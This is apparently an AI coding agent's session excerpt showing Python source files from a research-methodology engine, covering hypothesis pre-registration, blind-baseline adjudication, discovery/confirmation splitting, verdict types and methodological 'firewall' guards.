449	                hypotheses = list(plan.discover(discovery_corpus))  # only the discovery partition
450	                # within-run identity uniqueness: a repeated hypothesis_id would be counted once
451	                # per occurrence in the verdict accounting (#138)
452	                _require_unique_ids([h.hypothesis_id for h in hypotheses], "hypothesis_id")
453	                trail.record(
454	                    "discovery",
455	                    f"data surfaced {len(hypotheses)} candidate hypotheses",
456	                    n=len(hypotheses),
457	                    ids=[h.hypothesis_id for h in hypotheses],
458	                )
459	
460	            with tracer.span("phase:PREREGISTER"):
461	                enter(Phase.PREREGISTER)
462	                if not held_out.units:
463	                    raise FirewallViolation("confirmation partition selects no corpus units")
464	                preregister_instant = _now()
465	                for h in hypotheses:
466	                    if h.origin is not HypothesisOrigin.DISCOVERY:
467	                        raise FirewallViolation(
468	                            f"hypothesis {h.hypothesis_id!r} is {h.origin.value!r}; the discovery "
469	                            "phase expects DISCOVERY-origin (data-surfaced) hypotheses"
470	                        )
471	                    vt = require_preregistered(
472	                        h, authority=plan.authority, not_after=preregister_instant
473	                    )
474	                    trail.record(
475	                        "preregister",
476	                        f"locked hypothesis {h.hypothesis_id!r}",
477	                        hypothesis_id=h.hypothesis_id,
478	                        digest=vt.digest,
479	                        locked_at=vt.instant.isoformat(),
480	                    )
481	                run_gate(
482	                    GateReview(
483	                        gate="review-locked-hypotheses",
484	                        frm=Phase.PREREGISTER,
485	                        to=Phase.CONFIRM,
486	                        summary="review locked hypotheses before confirmatory testing",
487	                        payload={
488	                            "hypothesis_ids": [h.hypothesis_id for h in hypotheses],
489	                            "research_questions": list(defn.research_questions),
490	                        },
491	                    )
492	                )
493	
494	            with tracer.span("phase:CONFIRM"):
495	                enter(Phase.CONFIRM)
496	                confirmed: list[Verdict] = []
497	                for h in hypotheses:
498	                    verdict = plan.confirm_held_out(h, held_out)  # only the held-out partition
499	                    if verdict.hypothesis_id != h.hypothesis_id:
500	                        raise FirewallViolation(
501	                            f"verdict reports hypothesis_id {verdict.hypothesis_id!r} for "
502	                            f"hypothesis {h.hypothesis_id!r} — hypothesis↔verdict misattribution"
503	                        )
504	                    confirmed.append(verdict)
505	                    trail.record(
506	                        "verdict",
507	                        f"confirmed {h.hypothesis_id!r}: {verdict.label.value}",
508	                        hypothesis_id=h.hypothesis_id,
509	                        label=verdict.label.value,
510	                        rule=verdict.decision_rule,
511	                    )
512	                discovery_verdicts = tuple(confirmed)
513	                for lbl in ("supported", "contradicted", "indeterminate"):
514	                    n = sum(1 for v in discovery_verdicts if v.label.value == lbl)
515	                    track(_count_logger(f"discovery_{lbl}", float(n)))
516	
517	        # ---- ADJUDICATE → SCORE (Firewall A; the baseline built above is reused, blind) ----
518	        if StudyMode.ADJUDICATE_EXTERNAL_CLAIMS in modes:
519	            assert defn.claims_source is not None
520	            assert plan.hypothesis_for is not None and plan.confirm_claim is not None
521	            claim_records = list(defn.claims_source.claims())
522	            if not claim_records:
523	                raise ValueError(
524	                    "adjudication mode but the claims source yielded no claims — nothing to adjudicate"
525	                )
526	            # within-run identity uniqueness: a repeated claim_id would inflate the scorecard (#138)
527	            _require_unique_ids([c.claim_id for c in claim_records], "claim_id")
528	            # The engine fingerprints the EXACT claims it will score (authoritative), and records
529	            # the source's self-report separately for cross-check rather than trusting it (#137).
530	            engine_claim_fp = _engine_claim_fingerprint(claim_records)
531	            source_claim_fp = defn.claims_source.claim_fingerprint()
532	            prev_phase = Phase.CONFIRM if StudyMode.DISCOVERY in modes else Phase.BASELINE
533	            run_gate(
534	                GateReview(
535	                    gate="review-baseline-and-claims",
536	                    frm=prev_phase,
537	                    to=Phase.ADJUDICATE,
538	                    summary="review the blind baseline and the external claim set before adjudication",
539	                    payload={
540	                        "n_claims": len(claim_records),
541	                        "claim_ids": [c.claim_id for c in claim_records],
542	                        "claim_fingerprint": engine_claim_fp,  # engine-computed over scored claims
543	                        "source_reported_claim_fingerprint": source_claim_fp,  # unverified self-report
544	                        "claim_fingerprint_matches_source": engine_claim_fp == source_claim_fp,
545	                        "baseline_fingerprint": baseline.corpus_fingerprint,
546	                        "research_questions": list(defn.research_questions),
547	                    },
548	                )
549	            )
550	            with tracer.span("phase:ADJUDICATE"):
551	                enter(Phase.ADJUDICATE)
552	
553	                def _record_adjudication_step(h: Hypothesis, v: Verdict) -> None:
554	                    trail.record(
555	                        "preregister",
556	                        f"locked claim hypothesis {h.hypothesis_id!r}",
557	                        hypothesis_id=h.hypothesis_id,
558	                        source_claim_id=h.source_claim_id,
559	                        locked_at=h.locked_at,
560	                    )
561	                    trail.record(
562	                        "verdict",
563	                        f"adjudicated {v.hypothesis_id!r}: {v.label.value}",
564	                        hypothesis_id=v.hypothesis_id,
565	                        label=v.label.value,
566	                        rule=v.decision_rule,
567	                    )
568	
569	                # not_after = baseline_instant: a claim-derived hypothesis must have been locked
570	                # before the (shared) baseline existed. The SAME materialized claim_records that
571	                # were gated/recorded are scored (#95).
572	                scorecard = adjudicate_with_baseline(
573	                    baseline,
574	                    claim_records,
575	                    hypothesis_for=plan.hypothesis_for,
576	                    confirm=plan.confirm_claim,
577	                    authority=plan.authority,
578	                    not_after=baseline_instant,
579	                    source_name=defn.name,
580	                    on_step=_record_adjudication_step,
581	                )
582	            with tracer.span("phase:SCORE"):
583	                enter(Phase.SCORE)
584	                trail.record(
585	                    "score",
586	                    f"source scorecard for {defn.name!r}",
587	                    n_supported=scorecard.n_supported,
588	                    n_contradicted=scorecard.n_contradicted,
589	                    n_indeterminate=scorecard.n_indeterminate,
590	                    alignment_rate=scorecard.alignment_rate,
591	                )
592	                sc = scorecard
593	                track(lambda t, rid: t.log_metric(rid, "n_supported", float(sc.n_supported)))
594	                track(lambda t, rid: t.log_metric(rid, "n_contradicted", float(sc.n_contradicted)))
595	                track(
596	                    lambda t, rid: t.log_metric(rid, "n_indeterminate", float(sc.n_indeterminate))
597	                )
598	                ar = sc.alignment_rate
599	                if ar is not None:
600	                    track(lambda t, rid: t.log_metric(rid, "alignment_rate", float(ar)))
601	
602	        # ---- REPORT ----
603	        with tracer.span("phase:REPORT"):
604	            enter(Phase.REPORT)
605	            trail.record(
606	                "report",
607	                "assembled reproducibility package",
608	                n_discovery_verdicts=len(discovery_verdicts),
609	                has_scorecard=scorecard is not None,
610	            )
611	
612	        if tuple(visited) != required:
613	            raise FirewallViolation(
614	                f"visited phase sequence {[p.name for p in visited]} != required "
615	                f"{[p.name for p in required]}"
616	            )
617	        trail.verify()  # the provenance chain must be intact before we hand back the result
618	        ok = True
619	    except Exception as exc:
620	        # Record a terminal failure entry BEFORE re-raising so the abort reason is recoverable
621	        # from the (caller-owned) trail, not lost (#109).
622	        last_phase = visited[-1].name if visited else "start"
623	        try:
624	            trail.record(
625	                "run_failed",
626	                f"{type(exc).__name__} during {last_phase}",
627	                error_type=type(exc).__name__,
628	                message=str(exc)[:2000],
629	                last_phase=last_phase,
630	            )
631	        except Exception:  # noqa: BLE001,S110 — never mask the original failure
632	            pass
633	        raise
634	    finally:
635	        trace_ctx.close()
636	        if tracker is not None and run_id is not None:
637	            try:
638	                # a failed run must be distinguishable from a successful one in the store (#110)
639	                tracker.end_run(run_id, status="FINISHED" if ok else "FAILED")
640	            except Exception:  # noqa: BLE001,S110 — best-effort cleanup
641	                pass
642	
643	    return StudyResult(
644	        study=defn.name,
645	        corpus_fingerprint=cfp,
646	        baseline=baseline,
647	        discovery_verdicts=discovery_verdicts,
648	        scorecard=scorecard,
649	        phases=tuple(visited),
650	        provenance=trail.entries,
651	        source_version=source_version,
652	        feature_matrices=tuple(feature_matrices),
653	        experiment_run_id=run_id,
654	    )
655

content.text: The pipeline has been hardened substantially. Let me look at the adjudication/discovery runners and the baseline/feature builder boundary, where adapter callables return values that may not be validated.

content.content:
1	"""Adjudication runner — the engine owns the firewall guarantee, not each study (ADR-0008).
2	
3	METHODOLOGY.md describes the adjudication pipeline: build a baseline *blind* to the external
4	claims (Firewall A), convert each claim into a typed, pre-stated hypothesis, test each against
5	the blind baseline, and *score the external source* against the validated baseline (§5). Until
6	now the engine shipped the parts (a custodial :class:`ClaimBlindGuard`, the confirmatory tests,
7	the verdicts) but no composition — so Firewall A held only if a study wired it correctly by
8	hand. For a blueprint inherited by many studies, that pushes the single most important
9	methodological guarantee onto every cloner, where it is easy to get silently wrong (build the
10	baseline with the claims in scope and nothing stops you).
11	
12	:func:`adjudicate` makes the guarantee structural: it builds the baseline *inside* a sealed
13	claim-guard that holds the claims source, so the baseline builder cannot reach the claims
14	during construction (any attempt raises ``FirewallViolation``); only after the baseline is
15	built does the runner release the claims and adjudicate. It then aggregates the verdicts into a
16	:class:`SourceScorecard` — the §5 "score the source" step, expressed as alignment *frequency*
17	on decisive claims, explicitly NOT a normative judgement of the source's quality (richer
18	dimensions — where it aligns, diverges, leaves gaps — are data-surfaced downstream, per §5).
19	"""
20	
21	from __future__ import annotations
22	
23	import datetime as _dt
24	from dataclasses import dataclass, field
25	from typing import TYPE_CHECKING, Callable, Iterable, Protocol
26	
27	from assay_engine.contracts.claims import ClaimRecord, ExternalClaimsSource
28	from assay_engine.contracts.schema import Corpus
29	from assay_engine.methodology.firewalls import ClaimBlindGuard, FirewallViolation
30	from assay_engine.methodology.hypothesis import Hypothesis, HypothesisOrigin
31	from assay_engine.methodology.preregistration import (
32	    TimestampAuthority,
33	    require_preregistered,
34	)
35	from assay_engine.methodology.verdict import Verdict, VerdictLabel
36	
37	if TYPE_CHECKING:
38	    # Annotations only — importing baseline at runtime would invert the layering
39	    # (baseline.toolkit depends on methodology.firewalls) and create a cycle.
40	    from assay_engine.baseline.toolkit import BaselineArtifact, BaselineBuilder
41	
42	
43	class ClaimConfirmer(Protocol):
44	    """Study-supplied: confirm one claim-derived hypothesis against the (blind) baseline.
45	
46	    The study owns this because only it knows the baseline's structure and how a given claim
47	    maps onto a measurement of it; the engine supplies the confirmatory primitives
48	    (``confirm_whole_corpus`` / ``confirm_unit_level``) the study uses inside it.
49	    """
50	
51	    def __call__(
52	        self, hypothesis: Hypothesis, baseline: BaselineArtifact, claim: ClaimRecord
53	    ) -> Verdict: ...
54	
55	
56	@dataclass(frozen=True, slots=True)
57	class SourceScorecard:
58	    """How an external source aligns with the independent baseline (METHODOLOGY.md §5).
59	
60	    ``alignment_rate`` is supported / (supported + contradicted) — the fraction of *decisive*
61	    claims where the blind baseline agrees with the source's assertion. ``indeterminate`` is
62	    excluded from the denominator (the method could not decide; counting it would understate
63	    or overstate alignment). This is a frequency, not a verdict on whether the source is
64	    "good": it says how often an independent reading of the data corroborates the source.
65	    """
66	
67	    source: str
68	    n_supported: int
69	    n_contradicted: int
70	    n_indeterminate: int
71	    alignment_rate: float | None
72	    verdicts: tuple[Verdict, ...] = field(default_factory=tuple)
73	
74	    @property
75	    def total(self) -> int:
76	        return self.n_supported + self.n_contradicted + self.n_indeterminate
77	
78	    @property
79	    def decisive(self) -> int:
80	        return self.n_supported + self.n_contradicted
81	
82	
83	def _score(source: str, verdicts: list[Verdict]) -> SourceScorecard:
84	    counts = {
85	        VerdictLabel.SUPPORTED: 0,
86	        VerdictLabel.CONTRADICTED: 0,
87	        VerdictLabel.INDETERMINATE: 0,
88	    }
89	    for v in verdicts:
90	        counts[v.label] += 1
91	    decisive = counts[VerdictLabel.SUPPORTED] + counts[VerdictLabel.CONTRADICTED]
92	    rate = counts[VerdictLabel.SUPPORTED] / decisive if decisive else None
93	    return SourceScorecard(
94	        source=source,
95	        n_supported=counts[VerdictLabel.SUPPORTED],
96	        n_contradicted=counts[VerdictLabel.CONTRADICTED],
97	        n_indeterminate=counts[VerdictLabel.INDETERMINATE],
98	        alignment_rate=rate,
99	        verdicts=tuple(verdicts),
100	    )
101	
102	
103	def adjudicate(
104	    corpus: Corpus,
105	    claims_source: ExternalClaimsSource,
106	    *,
107	    baseline_builder: BaselineBuilder,
108	    hypothesis_for: Callable[[ClaimRecord], Hypothesis],
109	    confirm: ClaimConfirmer,
110	    authority: TimestampAuthority,
111	    source_name: str = "external",
112	) -> tuple[BaselineArtifact, SourceScorecard]:
113	    """Run the full adjudication, enforcing Firewall A by construction.
114	
115	    1. The claims source is kept in this function's local scope and is NOT handed to the
116	       builder; the baseline is built inside a sealed :class:`ClaimBlindGuard` that holds
117	       nothing. This is a **signature-level** guarantee: the builder is never *handed* a
118	       claims source by the engine, so it cannot accidentally consult the claims. It is NOT
119	       frame isolation — a builder that deliberately reflects into this runner's call stack
120	       (``sys._getframe``) could reach ``claims_source``; preventing that would require
121	       running the builder in a separate process, which is out of scope. The guarantee is
122	       against *accidental* circularity, not against a builder that willfully defeats the
123	       firewall.
124	    2. After the baseline exists, each claim is mapped (by ``hypothesis_for``) to its typed,
125	       pre-stated ``EXTERNAL_CLAIM`` hypothesis whose ``source_claim_id`` must match the claim
126	       and which must be genuinely **pre-registered** — :func:`~assay_engine.methodology.
127	       preregistration.require_preregistered` checks (via the supplied ``authority``) that the
128	       proof binds this hypothesis's content and that its attested lock time precedes the
129	       **baseline build** (the ordering instant is captured before the build). A claim-derived
130	       hypothesis must therefore be locked *before* ``adjudicate`` is called — ``hypothesis_for``
131	       looks up an already-locked hypothesis; locking on demand inside it (after the baseline
132	       exists) is rejected, so the hypothesis cannot have been tuned to the baseline.
133	    3. The verdict's ``hypothesis_id`` must match the hypothesis it answers (no misattribution),
134	       and the verdicts are aggregated into a :class:`SourceScorecard`.
135	
136	    ``authority`` is the pre-registration timestamp authority (e.g.
137	    :class:`~assay_engine.methodology.preregistration.LocalHmacAuthority`, or an RFC-3161
138	    adapter); the engine ships no silent-accept default, so a study must supply a real one.
139	
140	    Returns ``(baseline, scorecard)``. Raises ``FirewallViolation`` (incl.
141	    :class:`~assay_engine.methodology.preregistration.PreRegistrationError`) on any
142	    claim↔hypothesis↔verdict identity mismatch, a non-``EXTERNAL_CLAIM`` (data-surfaced)
143	    hypothesis, or a hypothesis that is not verifiably pre-registered before confirmation.
144	    """
145	    # The claims source stays in THIS function's local scope and is never given to the builder.
146	    # The builder receives a guard holding nothing (a blind-mode signal only), so there is no
147	    # object reachable from the builder that contains the claims — not even via the guard's
148	    # internals. This is stronger than a custodial guard, whose private `_claims_source` a
149	    # determined builder could read past the sealed `release()` check (adversarial review).
150	    # Captured BEFORE the baseline is built: an EXTERNAL_CLAIM hypothesis derives from the
151	    # external claim, not from the baseline, so it must be pre-registered before the baseline (the
152	    # answer) exists. Using this as `not_after` makes "lock before the result is in hand" real —
153	    # a hypothesis locked on demand inside `hypothesis_for` (i.e. after the build) is rejected,
154	    # forcing studies to pre-lock their claim-derived hypotheses (#83).
155	    not_after = _dt.datetime.now(tz=_dt.timezone.utc)
156	
157	    guard: ClaimBlindGuard[ExternalClaimsSource] = ClaimBlindGuard()
158	    with guard.sealed():
159	        baseline = baseline_builder.build(corpus, claim_guard=guard)
160	
161	    scorecard = adjudicate_with_baseline(
162	        baseline,
163	        claims_source.claims(),
164	        hypothesis_for=hypothesis_for,
165	        confirm=confirm,
166	        authority=authority,
167	        not_after=not_after,
168	        source_name=source_name,
169	    )
170	    return baseline, scorecard
171	
172	
173	def adjudicate_with_baseline(
174	    baseline: BaselineArtifact,
175	    claims: "Iterable[ClaimRecord]",
176	    *,
177	    hypothesis_for: Callable[[ClaimRecord], Hypothesis],
178	    confirm: ClaimConfirmer,
179	    authority: TimestampAuthority,
180	    not_after: _dt.datetime,
181	    source_name: str = "external",
182	    on_step: "Callable[[Hypothesis, Verdict], None] | None" = None,
183	) -> SourceScorecard:
184	    """Adjudicate a **materialized claim set** against an already-built blind baseline (core).
185	
186	    Factored out of :func:`adjudicate` so a composed pipeline that builds the baseline once
187	    (and shares it with discovery) can reuse the identical, hardened Firewall-A loop instead of
188	    rebuilding the baseline. The caller is responsible for having built ``baseline`` blind and
189	    for passing the ``not_after`` ordering instant captured *before* that build — so the
190	    lock-before-baseline guarantee is preserved across the shared-baseline composition.
191	
192	    ``claims`` is **materialized once** here (not re-pulled from a source): a caller that gated
193	    or recorded a claim snapshot must adjudicate *that* snapshot, not a set a re-iterable source
194	    could change between the gate and the scoring (adversarial review #95). Enforces the same
195	    claim↔hypothesis↔verdict identity + pre-registration checks as :func:`adjudicate`.
196	    """
197	    verdicts: list[Verdict] = []
198	    materialized = list(claims)  # claims used only after the blind baseline is built
199	    # within-run identity uniqueness: a repeated claim_id would be counted once per occurrence in
200	    # _score, inflating the scorecard denominator and biasing alignment_rate (#138).
201	    seen_claim_ids: set[str] = set()
202	    for c in materialized:
203	        if c.claim_id in seen_claim_ids:
204	            raise FirewallViolation(
205	                f"duplicate claim_id {c.claim_id!r} within one adjudication run — claim identity "
206	                "must be unique (a repeat would inflate the scorecard denominator)"
207	            )
208	        seen_claim_ids.add(c.claim_id)
209	    for claim in materialized:
210	        hypothesis = hypothesis_for(claim)
211	        if hypothesis.origin is not HypothesisOrigin.EXTERNAL_CLAIM:
212	            raise FirewallViolation(
213	                f"claim {claim.claim_id!r} produced a {hypothesis.origin.value!r} hypothesis; "
214	                "adjudicated claims must be EXTERNAL_CLAIM (pre-stated, not data-surfaced)"
215	            )
216	        if hypothesis.source_claim_id != claim.claim_id:
217	            raise FirewallViolation(
218	                f"hypothesis for claim {claim.claim_id!r} carries source_claim_id "
219	                f"{hypothesis.source_claim_id!r} — claim↔hypothesis misattribution"
220	            )
221	        # Pre-registration: the proof must bind THIS hypothesis's content (no post-lock content
222	        # swap) and its attested lock time must precede the baseline build (so the claim-derived
223	        # hypothesis cannot have been tuned to the baseline).
224	        require_preregistered(hypothesis, authority=authority, not_after=not_after)
225	        verdict = confirm(hypothesis, baseline, claim)
226	        if verdict.hypothesis_id != hypothesis.hypothesis_id:
227	            raise FirewallViolation(
228	                f"verdict for hypothesis {hypothesis.hypothesis_id!r} reports hypothesis_id "
229	                f"{verdict.hypothesis_id!r} — hypothesis↔verdict misattribution"
230	            )
231	        verdicts.append(verdict)

233	            # per-claim hook (in order) so a caller can record the pre-registered hypothesis AND
234	            # its verdict to provenance as each happens, not in a post-hoc batch (#93).

1	"""Discovery runner — Firewall B (discover/confirm separation) enforced by construction.
2	
3	The mirror of :mod:`assay_engine.methodology.adjudication`. In discovery mode the data surfaces
4	candidate hypotheses; Firewall B (METHODOLOGY.md §2, ADR-0005) requires that the data used to
5	*discover* a hypothesis is not the data used to *confirm* it — otherwise discovering a pattern
6	and "testing" it on the same data proves nothing.
7	
8	The engine had the split primitive (:class:`DiscoverConfirmSplit`) and a confirm step that
9	refuses discovery ids, but no composition — so the separation held only if a study wired it by
10	hand (same risk Firewall A had before ADR-0008). :func:`discover_and_confirm` makes it
11	structural: it hands the ``discover`` step a corpus containing *only* the discovery partition
12	and the ``confirm`` step a corpus containing *only* the held-out partition, so neither step can
13	accidentally use the other's data.
14	
15	Honest scope (lesson from the adjudication review, ADR-0008): the engine partitions the
16	**structural** data — units, and relations whose *both* endpoints are in the partition. It
17	does NOT carry the corpus's free-form ``metadata`` into a subset (an arbitrary mapping cannot
18	be partitioned safely — a per-unit index in metadata would otherwise leak the other partition
19	wholesale), and it cannot police free-text inside ``Unit``/``Relation.attributes`` that an
20	adapter might use to reference units outside the partition. So: the structural separation is
21	enforced; keeping per-unit data out of metadata/attribute *payloads* is the adapter's
22	obligation (the Firewall-B analogue of the corpus-content caveat in ADR-0005). And, as with
23	adjudication, this is a *signature-level* guarantee — it prevents accidental double-dipping,
24	not a step that willfully reflects into the caller's frame (only process isolation could).
25	"""
26	
27	from __future__ import annotations
28	
29	import datetime as _dt
30	from typing import Callable, Iterable, Protocol
31	
32	from assay_engine.contracts.schema import Corpus
33	from assay_engine.methodology.firewalls import DiscoverConfirmSplit, FirewallViolation
34	from assay_engine.methodology.hypothesis import Hypothesis, HypothesisOrigin
35	from assay_engine.methodology.preregistration import (
36	    TimestampAuthority,
37	    require_preregistered,
38	)
39	from assay_engine.methodology.verdict import Verdict
40	
41	
42	class HeldOutConfirmer(Protocol):
43	    """Study-supplied: confirm one locked, data-surfaced hypothesis on the held-out corpus."""
44	
45	    def __call__(self, hypothesis: Hypothesis, held_out: Corpus) -> Verdict: ...
46	
47	
48	def subset_corpus(corpus: Corpus, ids: Iterable[str]) -> Corpus:
49	    """Return the sub-corpus of ``corpus`` restricted to ``ids``.
50	
51	    Units not in ``ids`` are dropped; a relation is kept only if *both* endpoints are in
52	    ``ids`` (a relation to a unit outside the partition would leak that unit's existence/links
53	    into the partition).
54	
55	    Corpus-level ``metadata`` is deliberately **dropped**, not carried through: it is an
56	    arbitrary mapping the engine cannot partition safely. A per-unit index living in metadata
57	    (e.g. ``{"by_unit": {unit_id: ...}}``) would otherwise hand the discovery step the held-out
58	    partition wholesale — silently defeating Firewall B. Adapters that need partition-scoped
59	    side data must put it on the ``Unit``/``Relation`` records (which *are* partitioned), not in
60	    corpus metadata; free-text inside ``attributes`` that references foreign units remains the
61	    adapter's obligation (ADR-0005 / ADR-0008 honest-scope caveat).
62	    """
63	    keep = frozenset(ids)
64	    units = tuple(u for u in corpus.units if u.unit_id in keep)
65	    relations = tuple(r for r in corpus.relations if r.source_id in keep and r.target_id in keep)
66	    return Corpus(units=units, relations=relations)
67	
68	
69	def discover_and_confirm(
70	    corpus: Corpus,
71	    split: DiscoverConfirmSplit,
72	    *,
73	    discover: Callable[[Corpus], Iterable[Hypothesis]],
74	    confirm: HeldOutConfirmer,
75	    authority: TimestampAuthority,
76	) -> list[Verdict]:
77	    """Run discovery then confirmation with the data separation enforced by construction.
78	
79	    1. ``discover`` is handed a corpus containing only the discovery partition and returns
80	       candidate hypotheses. They must be ``DISCOVERY``-origin and genuinely **pre-registered**
81	       before confirmation — ``require_preregistered`` checks (via ``authority``) that the proof
82	       binds each hypothesis's content and that its attested lock time precedes confirmation.
83	       Discovering and confirming on the same data, or confirming a hypothesis whose content was
84	       changed after locking, is the double-dipping Firewall B exists to prevent.
85	    2. ``confirm`` is handed a corpus containing only the held-out partition and tests each
86	       hypothesis there; the verdict must report the hypothesis it answers.
87	
88	    ``authority`` is the pre-registration timestamp authority (e.g.
89	    :class:`~assay_engine.methodology.preregistration.LocalHmacAuthority`, or an RFC-3161
90	    adapter); the engine ships no silent-accept default. A study's ``discover`` step locks each
91	    discovered hypothesis (e.g. via :func:`~assay_engine.methodology.preregistration.
92	    lock_hypothesis`) before returning it.
93	
94	    Returns the verdicts. Raises ``FirewallViolation`` (incl. ``PreRegistrationError``) on an
95	    empty discovery or held-out partition (split ids that select no corpus units — a vacuous
96	    test), a non-``DISCOVERY`` hypothesis, a hypothesis that is not verifiably pre-registered
97	    before confirmation, or a verdict↔hypothesis misattribution.
98	    """
99	    discovery_corpus = subset_corpus(corpus, split.discovery_ids)
100	    if not discovery_corpus.units:
101	        # the discovery partition selects no actual corpus units — a hypothesis "discovered"
102	        # from zero data is not data-surfaced at all; it would confirm cleanly on the held-out
103	        # set and silently launder a hand-authored claim through Firewall B. Fail loud.
104	        raise FirewallViolation(
105	            "discovery partition selects no corpus units — nothing to discover from "
106	            "(do split ids match the corpus unit ids?)"
107	        )
108	    hypotheses = list(discover(discovery_corpus))  # sees only the discovery partition
109	
110	    held_out = subset_corpus(corpus, split.confirm_ids)  # disjoint from discovery (split invariant)
111	    if not held_out.units:
112	        # the confirmation partition selects no actual corpus units — confirming on an empty
113	        # held-out set is a vacuous test (the split ids don't match the corpus). Fail loud.
114	        raise FirewallViolation(
115	            "confirmation partition selects no corpus units — nothing to confirm on "
116	            "(do split ids match the corpus unit ids?)"
117	        )
118	    verdicts: list[Verdict] = []
119	    for hypothesis in hypotheses:
120	        if hypothesis.origin is not HypothesisOrigin.DISCOVERY:
121	            raise FirewallViolation(
122	                f"hypothesis {hypothesis.hypothesis_id!r} is {hypothesis.origin.value!r}; the "
123	                "discovery runner expects DISCOVERY-origin (data-surfaced) hypotheses"
124	            )
125	        # Pre-registration enforced by the runner: the proof must bind THIS hypothesis's content
126	        # (no post-lock content swap) and its attested lock time must precede this confirmation.
127	        require_preregistered(
128	            hypothesis, authority=authority, not_after=_dt.datetime.now(tz=_dt.timezone.utc)
129	        )
130	        verdict = confirm(hypothesis, held_out)
131	        if verdict.hypothesis_id != hypothesis.hypothesis_id:
132	            raise FirewallViolation(
133	                f"verdict reports hypothesis_id {verdict.hypothesis_id!r} for hypothesis "
134	                f"{hypothesis.hypothesis_id!r} — hypothesis↔verdict misattribution"
135	            )
136	        verdicts.append(verdict)
137	    return verdicts
138

1	"""The three verdicts (ADR-0004, METHODOLOGY.md §4).
2	
3	A confirmatory test returns exactly one of supported / contradicted / indeterminate — never
4	a forced binary. Every verdict carries the evidence and the decision rule behind it, so a
5	reviewer can re-derive it.
6	"""
7	
8	from __future__ import annotations
9	
10	from dataclasses import dataclass, field
11	from enum import Enum
12	from typing import Any, Mapping
13	
14	from assay_engine._frozen import freeze_mapping
15	
16	
17	class VerdictLabel(Enum):
18	    SUPPORTED = "supported"
19	    CONTRADICTED = "contradicted"
20	    INDETERMINATE = "indeterminate"
21	
22	
23	@dataclass(frozen=True, slots=True)
24	class Verdict:
25	    """The outcome of one confirmatory test, structured identically for all three labels.
26	
27	    ``indeterminate`` is first-class: underpowered, beyond the measurement's reach, or a
28	    disagreement plausibly attributable to a method limitation rather than a claim error.
29	    """
30	
31	    hypothesis_id: str
32	    label: VerdictLabel
33	    decision_rule: str
34	    statistic: float | None = None
35	    threshold: float | None = None
36	    evidence: Mapping[str, Any] = field(default_factory=dict)
37	    notes: str = ""
38	
39	    def __post_init__(self) -> None:
40	        # The label annotation is type-checker-only; a study-supplied confirmer (the public
41	        # ClaimConfirmer/HeldOutConfirmer Protocols) that returns a bare string label would
42	        # otherwise build a structurally-valid Verdict that later crashes _score with an opaque
43	        # KeyError and breaks verdict.label.value provenance lines. Fail fast and attributable
44	        # at construction instead (#133).
45	        if not isinstance(self.label, VerdictLabel):
46	            raise TypeError(
47	                f"Verdict.label must be a VerdictLabel, got {type(self.label).__name__!r} "
48	                f"({self.label!r}) for hypothesis {self.hypothesis_id!r}"
49	            )
50	        if not isinstance(self.hypothesis_id, str) or not self.hypothesis_id:
51	            raise ValueError("Verdict.hypothesis_id must be a non-empty str")
52	        object.__setattr__(self, "evidence", freeze_mapping(self.evidence))
53	
54	    @property
55	    def is_indeterminate(self) -> bool:
56	        return self.label is VerdictLabel.INDETERMINATE
57	
58	    @classmethod
59	    def supported(cls, hypothesis_id: str, decision_rule: str, **kw: Any) -> "Verdict":
60	        return cls(hypothesis_id, VerdictLabel.SUPPORTED, decision_rule, **kw)
61	
62	    @classmethod
63	    def contradicted(cls, hypothesis_id: str, decision_rule: str, **kw: Any) -> "Verdict":
64	        return cls(hypothesis_id, VerdictLabel.CONTRADICTED, decision_rule, **kw)
65	
66	    @classmethod
67	    def indeterminate(cls, hypothesis_id: str, decision_rule: str, **kw: Any) -> "Verdict":
68	        return cls(hypothesis_id, VerdictLabel.INDETERMINATE, decision_rule, **kw)

1	"""The two firewalls, enforced as runtime primitives (ADR-0005, METHODOLOGY.md §2).
2	
3	Both separations are enforced in code and exercised by tests — never asserted only in prose.
4	
5	Firewall A — claim-blindness:
6	    The baseline must be built blind to external claims. The *structural* guarantee is that
7	    the baseline builder is never handed an ``ExternalClaimsSource`` (its ``build`` signature
8	    takes only a ``Corpus``) and that ``StudyDefinition`` refuses a claims source outside
9	    adjudication mode. On top of that, :class:`ClaimBlindGuard` gives the claims source
10	    *custody*: hand the source to the guard, and the only way to obtain it is
11	    ``release()``/``access()``, which raise while the guard is sealed. Baseline construction
12	    runs inside ``sealed()``; adjudication runs after it.
13	
14	    Caveat (audit pass 1, issue #1): the guard cannot police a baseline builder that ignores
15	    it and reads external judgments smuggled into ``Corpus`` metadata/relations — that path
16	    is closed by the adapter contract (see schema.py), not by this guard. The guard is
17	    custodial defense-in-depth over the type-level separation, not the sole barrier.
18	
19	Firewall B — discover/confirm separation:
20	    The data used to discover a hypothesis must not be the data used to confirm it.
21	    :class:`DiscoverConfirmSplit` holds disjoint, non-empty discovery and confirmation id
22	    sets and refuses to confirm on any id the discovery phase touched (or on an empty set).
23	"""
24

26

28	from dataclasses import dataclass
29	from typing import Generic, Iterable, Iterator, TypeVar
30	
31	C = TypeVar("C")
32	
33	
34	class FirewallViolation(RuntimeError):
35	    """Raised when a methodological firewall is breached at runtime."""
36	
37	
38	class ClaimBlindGuard(Generic[C]):
39	    """Firewall A. While sealed, the held claims source is unreachable.
40	
41	    Custodial usage (preferred) — the guard owns the source, so the baseline pipeline holds
42	    the guard rather than the source and cannot read claims while sealed::
43	
44	        guard = ClaimBlindGuard(claims_source)
45	        with guard.sealed():
46	            corpus = parser.parse(source)            # baseline build — claims unreachable
47	            baseline = build_baseline(corpus, claim_guard=guard)
48	        claims = guard.release()                      # adjudication — guard released
49	
50	    ``access(obj)`` remains for defensive checks at call sites that hold a reference directly:
51	    it returns ``obj`` when unsealed and raises while sealed.
52	    """
53	
54	    def __init__(self, claims_source: C | None = None) -> None:
55	        self._sealed = False
56	        self._claims_source = claims_source
57	
58	    @property
59	    def is_sealed(self) -> bool:
60	        return self._sealed
61	
62	    @contextmanager
63	    def sealed(self) -> Iterator["ClaimBlindGuard[C]"]:
64	        prior = self._sealed
65	        self._sealed = True
66	        try:
67	            yield self
68	        finally:
69	            self._sealed = prior
70	
71	    def release(self) -> C:
72	        """Return the custodial claims source, or raise while sealed / if none was given."""
73	        if self._sealed:
74	            raise FirewallViolation(
75	                "Firewall A: external claims released during blind baseline construction"
76	            )
77	        if self._claims_source is None:
78	            raise FirewallViolation("Firewall A: no claims source is under this guard's custody")
79	        return self._claims_source
80	
81	    def access(self, claims_source: C) -> C:
82	        """Return ``claims_source`` only if the guard is not sealed; else raise."""
83	        if self._sealed:
84	            raise FirewallViolation(
